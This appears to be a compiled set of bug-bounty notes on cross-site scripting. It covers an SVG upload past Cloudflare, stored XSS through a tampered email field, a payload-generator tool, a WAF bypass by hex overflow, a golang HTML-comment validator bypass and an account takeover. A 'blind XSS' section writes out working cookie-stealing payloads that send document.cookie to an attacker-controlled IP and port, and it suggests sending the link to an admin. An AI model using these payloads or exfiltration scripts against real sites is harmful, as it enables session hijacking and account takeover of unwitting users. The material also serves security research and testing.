However, there was one small issue I observed here, which was whenever I tried to upload a file, and save it, **it showed a 403 forbidden error, since I am only a readonly user.** 

Now, I tried different file upload testcases here, some of which could be found in this writeup:

$FILE- UPLOAD- RESTRICTION -BYPASS$

> https://abhishekgk.medium.com/file-upload-restriction-bypass-4d2932005dcc

There was a small misconfiguration here, which was when I turn on the intercept, and capture the file upload request for valid file type which was png, and in the response, it initially uploads the file to the server, and shows the uploaded file path in the json response body. 

~={green}Even though the file upload was not successful in editing the admin dashboard after saving, =~**the file was getting stored somewhere else in the application.**

Now, the application only accepts png, jpeg, gif and svg file types. I tried to bypass the file validation to upload any malicious files, but was getting blocked constantly by cloudflare.

However, I tried the svg file with below contents, which somehow bypassed the cloudflare validation, and I was able to get the uploaded file path from the json body.

```html
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
    <script>//<![CDATA[
        alert(document.domain)
    //]]>
    </script>
</svg>
```

**MIME Type Confusion**: The file might have been identified as an image based on its MIME type, but the embedded script was not detected or blocked.

If I navigate to the path, or share this url to victim user, the javascript would execute in the users browser, allowing us to steal their cookies.

![None](https://miro.medium.com/v2/resize:fit:700/1*ZsOqRu_r3XiIoYsHnae1DQ.png)

							xss getting executed.

---

## XSS Reflected Server-Side without validation


I created an account on target.com and started exploring every functionalities. After spending couple of hours hunting and exploring functionalities **I saw my email address was reflected in the response in script tag as shown in below image.**

![](https://miro.medium.com/v2/resize:fit:436/1*6jiVpG9t9I5nrFpvGbIXTQ.png)

		Look at that email address.

Ahh… Very first thing came into my mind was XSS. I changed my email address to **_testacc@hubopss.com_‘_-alert(“h4ck3d!!”)-_’** **But failed because it is not a valid email address.** But In very next moment I intercepted the request ~={orange}using burp and changed my email address in intercepted request and forwarded it.
=~
						Boom….Got Stored XSS.

![](https://miro.medium.com/v2/resize:fit:700/1*IPN1G-i2MN_TLwG3UZRkJg.png)

		XSS is Love❤ (Sorry for poor picture quality😅)


![](https://miro.medium.com/v2/resize:fit:454/1*lQgGzwbfdPRK4b-D2BCnHg.png)

	Payload reflected without filtering/encoding/sanitizing special characters.

**Root cause of this XSS was lack of input validation at server side.** Website was validating email address at client side only that’s why it did not allowed me to directly input my payload in email field but as server ~={yellow}was not filtering out or encoding special characters my payload stored and I got the pop-up.=~


----

##  tool to generate XSS payloads.

**Scroll down a little bit, and you will find the installation steps.**

![](https://miro.medium.com/v2/resize:fit:700/1*KaZljQXcIK6fi_2h8RMIGg.png)


**Copy the below command.**

```
git clone https://github.com/capture0x/XSS-LOADER/  
cd XSS-LOADER  
pip3 install -r requirements.txt

```

**Paste it into your Kali Linux machine.**

![](https://miro.medium.com/v2/resize:fit:700/1*yK59vFlf3Ydi1hoWZqZcWg.png)

**After installing it.**

**Use this command to start the tool**

> python3 payloader.py

![](https://miro.medium.com/v2/resize:fit:700/1*1XEGbpZyA_-q722moziZTQ.png)

**There you can see some options.**

**Now let's select payload to tag :1**

**It selected a payload by default <script>alert(1)</script>**

![](https://miro.medium.com/v2/resize:fit:700/1*Jser7-_zL9oPm2Ljcpm6lQ.png)

**Now I selected 1) upper case**

![](https://miro.medium.com/v2/resize:fit:700/1*zva4YBlPO-mEc4ZvH1DxQQ.png)

**you can see payload. in the above image.**

**payload letters are all converted into uppercase.**

![](https://miro.medium.com/v2/resize:fit:700/1*rsMpK95dq6lWNIyDT15VbQ.png)

**Now you can see in the below image I am selecting. 24) waf bypass payloads.**

![](https://miro.medium.com/v2/resize:fit:700/1*_yK16Y4Z7zPTjRfBBt5lqw.png)

**Enter 6 to enter your own payload.**

example I entered 6 after I entered this payload 

```
<img src=x onerror=alert(1)>
```



![](https://miro.medium.com/v2/resize:fit:700/1*QHleSJmMR6fMAXRSyfJ_XA.png)

**Select 25 for Cloudflare bypass payloads.**

![](https://miro.medium.com/v2/resize:fit:700/1*oI-HLspdcwx02gSZxApe0Q.png)

> select 28 main one.

**It will give you all types of encoded payloads in the list.**

![](https://miro.medium.com/v2/resize:fit:700/1*wnUd1yZ0jLhWdKt7rs8TjQ.png)


**For custom payload.**

![](https://miro.medium.com/v2/resize:fit:700/1*PnvPMHj0zw0pl0eirR5SSQ.png)

**you can check all the types of encoding techniques listed in this tool.**

**encoding is important to bypass waf’s.**

**add this awesome tool to your toolbox.**

---

## XSS0r - Automated XSS Scanner:

> https://xss0r.com/

![[Pasted image 20250318221936.png]]

---
### XSS — Bypassing WAF with Hex Overflow

#sources: https://infosecwriteups.com/xss-bypassing-waf-with-hex-overflow-bafbf8bc43b0

Today I will be writing about how I bypassed BIG IP Local Traffic Manager (F5 Networks) Web Application Firewall using Hex Overflow.

# The XSS

Initially after observing that the input was unsanitized. I input a simple payload **<*svg onload=alert()>** . This was immediately blocked.

![](https://miro.medium.com/v2/resize:fit:700/1*lEZQKkC3gI_JvPI5lA2NEw.png)

So I started probing until the block was gone, and came to **<svg onload*>**, meaning **onload=** (with the equal sign) was actually getting blocked. After seeing this, I tried all possible event handlers there, and nothing worked out. Dead end?

# Introducing — Hex Overflow

Hex or Hexadecimal is a 16-Base number system allowing **0-F** **(0123456789ABCDEF)** maxing out at FF. It is very much common to us that reserved or unsafe characters [[RFC 1738 2.2](https://datatracker.ietf.org/doc/html/rfc1738#section-2.2)] are encoded in the URL which is two Hex digits following a percent-sign **‘%’ like %23 is the hex representation of hash/fragment symbol ‘#’.**

**Hex Overflow** occurs when a malformed URL decoder is used while handling of URL & allows character over the hex limit of 0-F exceeding to the usage of other alphabets including the symbols too [ ] { } ; : < > ! & more.

The decoder used in my target was a lot confusing & didn’t make sense at all to be honest. I can guess they also used more than one logic behind the decoder. The output was all in small letters adding up to the confusion more.

**What do you expect when you input %5% ?**  
The output to is ‘e’ or 0x55. Wondering how? The decoder takes the first 5, then decoded the second ‘%’ symbol to %25 & ignores the first nibble ‘2’ and takes the 5 from there. Making it %55. 

And as it was a overflown character,~={orange} it does a **-1** from the first nibble of the result making it %45 a capital ‘e’. So %7% resulted in %65 or capital ‘e’. And yes, %8% , %6% resulted in %75 or small ‘u’=~ & %55 or capital ‘u’ respectively.

**Now you might be wondering how was it handling the alphabet parts of the hex?  
**The answer is — pretty weirdly! In first stage it was handling **abcdef** normally but when overflowing it was calling the alphabets with a index number which started from ‘g’ as 0.

![](https://miro.medium.com/v2/resize:fit:700/1*h4_OVoFrsZAP1tAfqABNFQ.png)

Upon more observation, I found out that it can be used as 2 different sets. And When Mixed, it is something like this.

![](https://miro.medium.com/v2/resize:fit:700/1*gVjoi-WxrvIJAu-n1iLC4w.png)

If the any of the characters from two sets are used together a +1 can be seen to the first nibble, if it is from the set green, meaning a input of %5g which is %50 according to this chart will output ‘%(5+1)0’ or %60 → ` (Backtick). Again if it’s %hz (h is from the 2nd set) which is %13 according to the chart, it will output ‘%(1+2)3’ or %33 → ‘3’

The worst part to all of these is that the pattern is not always constant and full workflow couldn’t be calculated.

**Sometimes it did +1, for some it did +2 or +3 and for some also a subtraction to the first nibble. But this understanding was enough for my bypass.**

# The Bypass

As in the beginning we saw that there were no ways this could possibly be bypassed as each and every handlers were blocked, we needed some other way around.

Using Hex Overflow — we can generate a single ASCII character using a whole lot of different ways. If you already understand, you can actually represent the **“=”** equal sign (**%3d**) also by ‘**%3=’** which can be explained like **%3** **%3d** where the first nibble gets ignored making it again **%3d**.

Also ‘**%zd’,** ‘**%z=’,** ‘**%jd’,** ‘**%it’** (-1 from the first nibble in this case). We can use all of these in place of equal sign like **<svg onload%jdonload=alert()>**

![](https://miro.medium.com/v2/resize:fit:700/1*PsCT5fOv0pq6GBg6HHzobQ.png)

It again blocked our payload, reason? This time **alert()** was the blocked function. This was easily bypassed by **optional chaining** → **alert?.()** .

![](https://miro.medium.com/v2/resize:fit:700/1*HNiOhxRksBqKsYnZCEJf9A.png)

It doesn’t just limit here, it can be bypassed using a lot of other ways generating different parts of payload using hex overflow like **%0d (CR)** to **‘%0=’** or **‘%w=’** making the payload **<svg onload%w==alert()>**.

# Conclusion

This kind of flawed decoders are very rare to encounter and all might not be flawed the same way.


---

## Cross Site Leaks:

[XS Leaks - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html)


<iframe width="928" height="522" src="https://www.youtube.com/embed/4CNEgTDXI-U" title="$2,500 Leaking parts of private Hackerone reports - timeless cross-site leaks" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
<iframe width="928" height="522" src="https://www.youtube.com/embed/d4KQqQz4LZI" title="$XX,000 Airbnb impossible XSS with 4 bypasses" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


---

### 3000$ Blind Xss Hijack admin panel
_This idea is not limited only to the admin, it also applies to a place where XSS can be used, whether (reflected, imported, POST, or GET)._

**First make sure you find an injecteble xss:**

### Verify Payload Injection

First, you need to confirm that your payload is successfully injected. Here’s how:

- **Check the source code:** After injecting your payload, view the page source to see if your `<script>` tag appears.
    
- **Use browser developer tools:** Open developer tools (usually F12 or right-click and select "Inspect") and look for your payload in the DOM (Document Object Model).

or just use another browser and see if it executes.

***-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-****-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-

The attacker steals the Cookie, and through the victim’s cookie, **he enters in the target’s account (the admin or the user).**  
So we need to write a two-part code, the first to enter your server + to display the cookie session through the JavaScript code


1- First, create a file with the .js extension inside the server

```js
alert(document.domain);  
var i=new Image;  
i.src="http://<ip>:<anyport>/?cookie="+document.domain;
```

_**Save the file:** When saving the file, make sure the filename ends with `.js`. For example, you can name it `xss.js`._

2- Open a connection with any tool such as Netcat, so you can monitor the Apache HTTP Server log. I use a model inside Python 3 as follows: -

```bash
python3 -m http.server <port>
```

3- After opening a connection to the server, take the host with a link to the .js file  
And call it with any js2 code, such as:

```html
<script src="http://<ip>/xss.js"></script>
```

**Replace `<ip>` with your own IP address. This ensures that the script file `xss.js` is hosted on your server, and the requests made by the victim's browser are directed to your server, allowing you to capture the cookie information.**


The Request will be delivered to you from the website with a cookie package, as shown in the picture  
(In the real scenario of the attack, I injected the js code 2 **into the request to verify my account** and waited for about two hours. 

### Example Request

Here's how the request might look:

```js
GET /verify?token=<script>var i = new Image(); i.src = "http://123.456.78.90:8000/?cookie=" + document.cookie;</script> HTTP/1.1 Host: example.com
```

**When the admin visits this URL, the script runs, and the attacker's server receives the cookie information. In which, the URL might look like this:**

```html
http://example.com/verify?token=<script>var i = new Image(); i.src = "http://your-ip:your-port/?cookie=" + document.cookie;</script>

```

Once the admin accessed my request, the js code was activated and I received my cookie session inside http. sever log.  
An hour after the Report, the vulnerability was fixed

![](https://miro.medium.com/v2/resize:fit:875/0*WgsuBkzhEOi6Z1wc)

					output of the stolen cookie

-> send to the admin and hope they open it 

```html
http://example.com/?q=<script>var i = new Image(); i.src = "http://your-ip:your-port/?cookie=" + document.cookie;</script>
```

---

XSS Url encoding by lostsec:

https://youtu.be/s96Dos8i8Qg


---

## $3,133.70 XSS in golang's net/html library

This is how HTML comments normally look like:

![[Pasted image 20250202174557.png]]


_and you may be wondering.. what's the point of messing up with comments?  **What could you achieve?**_

![[Pasted image 20250202174651.png]]

For simplicity, let's only allow headers tags.

So i write some code that takes the description from the user, parses the HTML, and checks whether all tags that are in this HTML **are allowed or not.**

![[Pasted image 20250202175127.png]]

if they are not, i forbid the user from saving this description. if they are, i'd consider this description safe and i show it to other users, where this HTML is being parsed in thri browsers.

![[Pasted image 20250202175313.png]]

so if we manage to hide some html code in the comment section, **We will manage to get xss working.**

So let's come back to the comment section, the specifications of how parsers should parse the comments, mention a few exceptions:

One rule says that if a **GREATER** character is immediatly after the beginning, then this is considered an empty comment:

![[Pasted image 20250202180121.png]]

Another rule, says that if a comment is closed with this sequence with exclamation mark  on both ends, then, is considered also as a closed comment:

![[Pasted image 20250202180403.png]]



## Golang validator bypass

But then, what do you think should happen with this..? 

![[Pasted image 20250202180450.png]]

If you combine the logic from these two rules, you should interpret this as a **valid empty comment** However, there is nothing in the specification saying that these two can be used togheter

![[Pasted image 20250202180647.png]]

![[Pasted image 20250202180741.png]]


![[Pasted image 20250202180838.png]]

![[Pasted image 20250202180855.png]]

This description is allowed because the golang validator sees the first part  (which is ~={blue}<*!--!*>=~) a **closed valid comment**.


but the browser process it as a ~={yellow}comment opening=~ with then, after ~={red}the H1 tag would be the comment's content,=~ Then the comment would be closed (which is the comment opening with "~={blue}- - >=~") and  after that, the rest will be ~={orange}processed as a valid HTML.=~

This way, we ~={green}smuggled an 'a' tag past the validator=~, and ~={red}the XSS can execute in the victim's browser if they click on this link.=~


![[Pasted image 20250202181740.png]]

## POC:

![[Pasted image 20250202182007.png]]

![[Pasted image 20250202182049.png]]


---

# Account Takeover via XSS in e-signature feature worth 2500$


When I tried xss payload with in name field, like **_“><img onerror=alert(document.domain) src>_** everything was oky. The output was:

**_&quot;&gt;&lt;img onerror=alert(document.domain) src&gt;_**

Then I realized that this isn’t my xss payload that I always use 😇 Are you ready to this payload? That was :

```
"><<img onerror=alert(document.cookie) src>_
```

Yes, just one more ‘**_<_**’. I got an alert in the admin page from an unauthenticated user. Output was:

```
&quot;&gt;<img onerror=alert(document.cookie) src>
```

> Note: ==You can use== ==[https://github.com/projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh)==

When xss triggered everything was in my heroku logs. Oky, this is account takeover but what we can do with this account? In this application, which has an integrated system with many cloud storage applications, we have access to all files in it if the account is connected with application. We can also access all signed documents and company files.

![](https://miro.medium.com/v2/resize:fit:896/1*TYCkvyR4vvGUSmupLALnHw.png)

![](https://miro.medium.com/v2/resize:fit:260/1*Dhq8l2dGxPQU8iMmqOfbqA.png)

[](http://twitter.com/gkhck_)

***-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-****-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-*-**-*-*-*-